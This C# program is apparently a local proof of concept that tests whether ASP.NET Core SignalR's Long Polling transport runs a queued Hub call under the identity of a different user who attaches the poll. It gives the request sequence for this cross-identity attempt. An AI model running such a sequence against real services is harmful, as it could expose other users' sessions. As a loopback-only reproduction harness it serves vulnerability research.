using System.Net;
using System.Net.Http.Headers;
using System.Security.Claims;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.SignalR;

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls("http://127.0.0.1:0");
builder.Services.AddSignalR();

var app = builder.Build();

// Test-only identity source. The app binds only to loopback and accepts no
// credentials from outside this local process.
app.Use(async (context, next) =>
{
    var testUser = context.Request.Headers["X-Test-User"].ToString();
    if (!string.IsNullOrWhiteSpace(testUser))
    {
        var identity = new ClaimsIdentity(
            new[] { new Claim(ClaimTypes.Name, testUser) },
            authenticationType: "LocalSignalRPoC",
            nameType: ClaimTypes.Name,
            roleType: ClaimTypes.Role);
        context.User = new ClaimsPrincipal(identity);
    }

    await next();
});

app.MapHub<IdentityProbeHub>("/probe");
await app.StartAsync();

try
{
    var server = app.Services.GetRequiredService<IServer>();
    var addresses = server.Features.Get<IServerAddressesFeature>()
        ?? throw new InvalidOperationException("Kestrel address feature unavailable.");
    var address = addresses.Addresses.Single();
    using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(25) };

    Console.WriteLine($"Local test server: {address}");
    Console.WriteLine($"Runtime: {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");

    // Positive control: the same identity negotiates, sends, and attaches.
    var control = await RunScenario(client, address, "Alice", "Alice", "Alice");
    Console.WriteLine($"CONTROL same identity: {control.Status}; Hub saw: {control.Identity ?? "<none>"}");
    if (control.Status != ScenarioStatus.Completed || control.Identity != "Alice")
    {
        Console.WriteLine("INCONCLUSIVE: the same-identity control did not complete.");
        Environment.ExitCode = 2;
        return;
    }

    // Hypothesis under test: A negotiates and queues a Hub invocation; B is
    // the identity on the first Long Polling attach request.
    var candidate = await RunScenario(client, address, "Alice", "Alice", "Bob");
    Console.WriteLine($"CROSS-IDENTITY: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}");

    if (candidate.Status == ScenarioStatus.Completed && candidate.Identity == "Bob")
    {
        Console.WriteLine("VULNERABILITY_REPRODUCED: the queued invocation executed as the attaching identity Bob.");
        Environment.ExitCode = 0;
    }
    else if (candidate.Status == ScenarioStatus.Completed)
    {
        Console.WriteLine($"NOT_REPRODUCED: the invocation completed as '{candidate.Identity ?? "<anonymous>"}', not Bob.");
        Environment.ExitCode = 1;
    }
    else
    {
        Console.WriteLine("INCONCLUSIVE: no Hub completion was observed for the cross-identity case.");
        Environment.ExitCode = 2;
    }
}
finally
{
    await app.StopAsync();
}

static async Task<ScenarioResult> RunScenario(
    HttpClient client,
    string baseAddress,
    string negotiateIdentity,
    string sendIdentity,
    string attachIdentity)
{
    var negotiate = new HttpRequestMessage(
        HttpMethod.Post,
        $"{baseAddress.TrimEnd('/')}/probe/negotiate?negotiateVersion=1");
    negotiate.Headers.Add("X-Test-User", negotiateIdentity);

    using var negotiateResponse = await client.SendAsync(negotiate);
    var negotiateBody = await negotiateResponse.Content.ReadAsStringAsync();
    if (!negotiateResponse.IsSuccessStatusCode)
        return new ScenarioResult(ScenarioStatus.Rejected, null, $"Negotiate returned {(int)negotiateResponse.StatusCode}: {negotiateBody}");

    using var negotiateJson = JsonDocument.Parse(negotiateBody);
    if (!negotiateJson.RootElement.TryGetProperty("connectionToken", out var tokenElement))
        return new ScenarioResult(ScenarioStatus.Rejected, null, "Negotiate response did not contain connectionToken.");

    var token = tokenElement.GetString();
    if (string.IsNullOrWhiteSpace(token))
        return new ScenarioResult(ScenarioStatus.Rejected, null, "Negotiate returned an empty connectionToken.");

    // Long Polling must be attached before the client can POST Hub protocol
    // frames. Start the first poll under attachIdentity, then send the
    // handshake and invocation under sendIdentity while that poll is pending.
    const char recordSeparator = '\u001e';
    var queuedFrames =
        "{\"protocol\":\"json\",\"version\":1}" + recordSeparator +
        "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}" + recordSeparator;

    using var poll = new HttpRequestMessage(
        HttpMethod.Get,
        $"{baseAddress.TrimEnd('/')}/probe?id={Uri.EscapeDataString(token)}");
    poll.Headers.Add("X-Test-User", attachIdentity);
    var pollTask = client.SendAsync(poll, HttpCompletionOption.ResponseHeadersRead);
    await Task.Delay(150);

    using var send = new HttpRequestMessage(
        HttpMethod.Post,
        $"{baseAddress.TrimEnd('/')}/probe?id={Uri.EscapeDataString(token)}");
    send.Headers.Add("X-Test-User", sendIdentity);
    send.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(queuedFrames));
    send.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

    using var sendResponse = await client.SendAsync(send);
    var sendBody = await sendResponse.Content.ReadAsStringAsync();
    if (!sendResponse.IsSuccessStatusCode)
    {
        try { using var ignored = await pollTask; } catch { }
        return new ScenarioResult(ScenarioStatus.Rejected, null, $"Send returned {(int)sendResponse.StatusCode}: {sendBody}");
    }

    // The initial GET establishes the Long Polling transport and commonly
    // completes with an empty body. Start a second GET to receive Hub frames.
    using var initialPollResponse = await pollTask;
    var initialPollBody = await initialPollResponse.Content.ReadAsStringAsync();
    if (!initialPollResponse.IsSuccessStatusCode)
        return new ScenarioResult(ScenarioStatus.Rejected, null, $"Initial poll returned {(int)initialPollResponse.StatusCode}: {initialPollBody}");

    using var receive = new HttpRequestMessage(
        HttpMethod.Get,
        $"{baseAddress.TrimEnd('/')}/probe?id={Uri.EscapeDataString(token)}");
    receive.Headers.Add("X-Test-User", attachIdentity);
    using var pollResponse = await client.SendAsync(receive);
    var responseBody = await pollResponse.Content.ReadAsStringAsync();
    if (!pollResponse.IsSuccessStatusCode)
        return new ScenarioResult(ScenarioStatus.Rejected, null, $"Receive poll returned {(int)pollResponse.StatusCode}: {responseBody}");

    foreach (var frame in responseBody.Split(recordSeparator, StringSplitOptions.RemoveEmptyEntries))
    {
        try
        {
            using var message = JsonDocument.Parse(frame);
            var root = message.RootElement;
            if (root.TryGetProperty("type", out var type) &&
                type.GetInt32() == 3 &&
                root.TryGetProperty("invocationId", out var invocationId) &&
                invocationId.GetString() == "identity-check-1" &&
                root.TryGetProperty("result", out var result))
            {
                return new ScenarioResult(ScenarioStatus.Completed, result.GetString(), null);
            }
        }
        catch (JsonException)
        {
            // Ignore non-JSON frames; only the matching Hub completion matters.
        }
    }

    return new ScenarioResult(ScenarioStatus.NoCompletion, null,
        $"No matching Hub completion in first poll response: {responseBody}");
}

public sealed class IdentityProbeHub : Hub
{
    public string WhoAmI() =>
        Context.User?.Identity?.Name ?? "<anonymous>";
}

public enum ScenarioStatus
{
    Completed,
    Rejected,
    NoCompletion
}

public sealed record ScenarioResult(
    ScenarioStatus Status,
    string? Identity,
    string? Detail);
